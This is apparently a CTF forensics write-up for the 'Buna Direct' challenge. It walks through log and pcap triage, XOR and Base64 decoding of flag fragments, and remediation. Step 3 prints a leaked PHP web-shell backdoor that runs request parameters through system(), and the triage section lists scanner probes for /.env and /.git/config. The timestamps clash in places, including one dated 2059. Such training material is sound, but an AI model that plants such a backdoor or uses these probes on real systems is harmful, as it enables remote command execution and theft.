---
title: "Buna Direct — Worker Crash & Cache Pivot"
category: forensics
platform: BunaByte
difficulty: Hard
points: 300
solves: 18
flag: "BB{scr4tch_buf_n3v3r_z3r03d_c4che_k3y_r3us3d_p0st_crash}"
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "forensics"
  - "bunabyte"
---

# Buna Direct — Worker Crash & Cache Pivot

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

**Flag:** `BB{scr4tch_buf_n3v3r_z3r03d_c4che_k3y_r3us3d_p0st_crash}`

---

## Challenge Overview

> The capture is busy. There's a vulnerability scanner hammering common paths, a brute-force attempt against session creation, and more than one oversized upload, most of which the server handled just fine. Somewhere in all of that, exactly one connection actually crashed a worker, and exactly one follow-up request actually pivoted into something it shouldn't have.
>
> Nothing in the evidence is labeled for you. There's no comment that says "here's the flag." Both halves require you to actually decode something, and for one of them, the decode key isn't written down anywhere. You have to pull it out of the traffic yourself.

**Evidence Package:** `evidence.zip`
- `logs/access.log` — Web server access logs
- `logs/error.log` — PHP-FPM service error log
- `logs/crash-20261022-091452.log` — Crash artifact with scratch heap dump
- `network/capture.pcap` — 374-packet network capture

---

## Triage & Noise Filtering

The packet capture contains 37 distinct TCP streams with considerable background noise:

1. **Path Fuzzing / Scanning (Streams 12–19):**
   `203.0.113.90` (User-Agent: `masscan/1.3`) hammers common discovery paths (`/wp-admin`, `/.env`, `/phpinfo.php`, `/admin`, `/.git/config`, `/server-status`, `/.well-known/security.txt`, `/xmlrpc.php`). All return `404 Not Found`.

2. **Session Creation Brute-Force (Streams 20–25):**
   `203.0.113.95` (User-Agent: `python-requests/2.31`) repeatedly fires `POST /api/session/create` payloads, all failing with `401 Unauthorized`.

3. **Handled Oversized Uploads (Streams 26 & 27):**
   Both `203.0.113.77` (port 57000) and `203.0.113.90` (port 57001) submit ~50 MB uploads (`boundary=----decoy`) to `POST /api/order/upload`. Nginx safely terminates both with `413 Payload Too Large`.

---

## Step 1 — Isolating the Worker Crash (Stream 28)

In `logs/error.log`, exactly one fatal worker crash is recorded:

```text
[22-Oct-2026 09:00:51 UTC] PHP Fatal error:  Allowed memory size exhausted while buffering multipart body in /var/www/buna-direct/api/order/upload.php on line 142
[22-Oct-2026 09:00:51 UTC] WARNING: [pool www] child 2381 exited on signal 11 (SIGSEGV) after 182.441405 seconds from start
[22-Oct-2026 09:00:51 UTC] NOTICE: crash artifact written to /var/log/buna-direct/crash-20261022-091452.log
```

Correlating timestamps with `network/capture.pcap` points directly to **TCP Stream 28** (`203.0.113.77:58010 -> 198.51.100.23:80`):

```http
POST /api/order/upload HTTP/1.1
Host: buna-direct.local
X-Owner-Ref: owner_unverified
Content-Type: multipart/form-data; boundary=----wk9Z
Content-Length: 1073741824
Connection: keep-alive
```

The client announced a 1 GB `Content-Length`. After buffering exactly 4,096 bytes, the application tripped the internal OOM guard and aborted:

```text
allocator state: OOM guard tripped at 1073741824 bytes requested, 4096 bytes actually buffered before abort
```

The kernel signaled `SIGSEGV` (signal 11) to worker PID 2381, causing nginx to send a TCP `[RST, ACK]` back to the client at packet 294.

---

## Step 2 — Decoding Fragment 1 from the Crash Heap Dump

The triage notes in `logs/crash-20261022-091452.log` highlight a critical detail:

> *"The scratch buffer above is reused across requests on the same worker and is not zeroed between them — whatever was in it when the fault happened survived into this dump."*

Looking at the raw heap dump:

```text
0x7f2a1c000050  81 a7 3d 50 48 46 e1 4e 14 9a 68 03 3d 8e 4c aa  |..=PHF.N..h.=.L.|
0x7f2a1c000060  d9 c9 d8 9e de c9 c2 f5 c8 df cc f5 c4 99 dc 99  |................|
0x7f2a1c000070  d8 f5 d0 99 d8 9a 99 ce aa 49 40 38 d9 aa 45 08  |.........I@8..E.|
```

Notice the repeating byte `0xaa` framing the sequence at offsets `0x5f` and `0x78`. Since C-strings are null-terminated (`0x00`), `0x00 ^ KEY = 0xaa` implies a single-byte XOR key of `0xaa`:

```python
dump_bytes = bytes.fromhex(
    "d9 c9 d8 9e de c9 c2 f5 c8 df cc f5 c4 99 dc 99 d8 f5 d0 99 d8 9a 99 ce"
)
fragment_1 = bytes(b ^ 0xaa for b in dump_bytes).decode()
print("Fragment 1:", fragment_1)
```

**Output:**
```text
Fragment 1: scr4tch_buf_n3v3r_z3r03d
```

---

## Step 3 — Identifying the Follow-Up Pivot (Stream 29 & 32)

Following the crash, the attacker from `203.0.113.77` pivots using two requests:

### 1. Diagnostic Endpoint Discovery (Stream 29)
The attacker presents session token `415a26e814db` (stolen from legitimate user `customer_41` in Stream 10) to refresh the session:

```http
POST /api/session/refresh HTTP/1.1
Host: buna-direct.local
X-Session-Ref: 415a26e814db
Content-Length: 2

{}
```

Response:
```json
{"status":"refreshed","diagnostic_endpoint":"/assets/.cache/svc_7f3e9d.php"}
```

### 2. The Unauthorized Pivot (Stream 32)
In **Stream 32**, the attacker requests the cached diagnostics script:

```http
GET /assets/.cache/svc_7f3e9d.php HTTP/1.1
Host: buna-direct.local
```

Under normal operation, this file would execute via FastCGI. However, `logs/error.log` notes:
```text
[17-May-2059 21:54:06 UTC] NOTICE: static fallback handler served /assets/.cache/svc_7f3e9d.php as text/plain (php-fpm pool still recovering)
```

Because worker 2381 crashed and the pool was still respawning replacement children, nginx's fallback handler served the raw PHP script as `text/plain`, leaking a diagnostic backdoor:

```php
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 157
Server: nginx/1.25.3
X-Request-Id: YzRjaGVfazN5X3IzdXMzZF9wMHN0X2NyYXNo
Connection: keep-alive

<?php
// buna-direct diagnostics -- temporary, auto-expires with cache TTL
if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); }
echo "healthcheck ok";
```

---

## Step 4 — Extracting the Decode Key & Fragment 2

Inspecting the response headers of Stream 32 reveals an anomalous `X-Request-Id`:

```http
X-Request-Id: YzRjaGVfazN5X3IzdXMzZF9wMHN0X2NyYXNo
```

Unlike the random SHA-like request IDs in other streams, this header Base64-decodes directly into the second fragment:

```python
import base64
fragment_2 = base64.b64decode("YzRjaGVfazN5X3IzdXMzZF9wMHN0X2NyYXNo").decode()
print("Fragment 2:", fragment_2)
```

**Output:**
```text
Fragment 2: c4che_k3y_r3us3d_p0st_crash
```

---

## Step 5 — Assembling the Flag

Combining both decoded pieces in standard BunaByte CTF format:

```text
Fragment 1 (Crash heap dump):  scr4tch_buf_n3v3r_z3r03d
Fragment 2 (Traffic header):   c4che_k3y_r3us3d_p0st_crash

Flag: BB{scr4tch_buf_n3v3r_z3r03d_c4che_k3y_r3us3d_p0st_crash}
```

---

## Vulnerability Remediation

1. **Strict Request Body Limits:** Enforce maximum multipart and body size limits directly at the reverse proxy layer (`client_max_body_size` in nginx) rather than letting multi-gigabyte requests reach PHP workers.
2. **Buffer Sanitization:** Scratch pools and reusable worker memory buffers must be explicitly zeroed (`memset`) between requests to prevent residual state and secret leakage across process lifecycles.
3. **Prevent Static Execution Fallbacks:** Do not configure web servers to fall back to static file delivery for executable script paths (`.php`) when FastCGI upstream pools fail or restart.
